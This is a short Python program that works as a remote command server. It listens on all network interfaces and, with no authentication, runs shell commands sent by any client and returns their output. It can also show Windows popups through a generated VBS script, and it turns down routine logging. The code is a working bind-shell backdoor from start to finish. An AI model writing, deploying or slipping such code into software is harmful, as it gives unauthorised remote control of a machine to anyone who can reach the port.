import socket
import subprocess
import threading
import os
import logging

# Configure logging to suppress output
logging.basicConfig(level=logging.CRITICAL)

# Server configuration
HOST = '0.0.0.0'  # Listen on all available interfaces
PORT = 65432  # Port to listen on

def execute_command(command, conn):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        if stdout:
            conn.sendall(stdout.encode('utf-8'))
        if stderr:
            conn.sendall(stderr.encode('utf-8'))
        if not (stdout or stderr):
            conn.sendall(b'Command executed with no output.')
    except Exception as e:
        conn.sendall(f"Error: {str(e)}".encode('utf-8'))

def show_vbs_popup(message):
    vbs_code = f'Set obj = CreateObject("WScript.Shell")\nobj.Popup "{message}", 5, "Message", 64'
    vbs_file = 'popup.vbs'
    with open(vbs_file, 'w') as file:
        file.write(vbs_code)
    os.system(f'cscript //nologo {vbs_file}')
    os.remove(vbs_file)

def handle_client(conn, addr):
    with conn:
        print(f"Connected by {addr}")
        while True:
            try:
                data = conn.recv(1024).decode('utf-8')
                if not data:
                    break
                if data.lower() == 'exit':
                    conn.sendall(b'Connection closed.')
                    break
                if data.lower().startswith('command '):
                    command = data[8:].strip()
                    threading.Thread(target=execute_command, args=(command, conn)).start()
                elif data.lower().startswith('chat '):
                    message = data[5:].strip()
                    show_vbs_popup(message)
                    conn.sendall(b'Popup displayed for non-command text.')
                else:
                    conn.sendall(b'Invalid input. Prefix with "command " or "chat ".')
            except ConnectionResetError:
                print(f"Connection reset by {addr}")
                break
            except Exception as e:
                print(f"Error handling client {addr}: {e}")
                break

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(5)
        print(f"Server listening on {HOST}:{PORT}")
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr)).start()

if __name__ == "__main__":
    main()
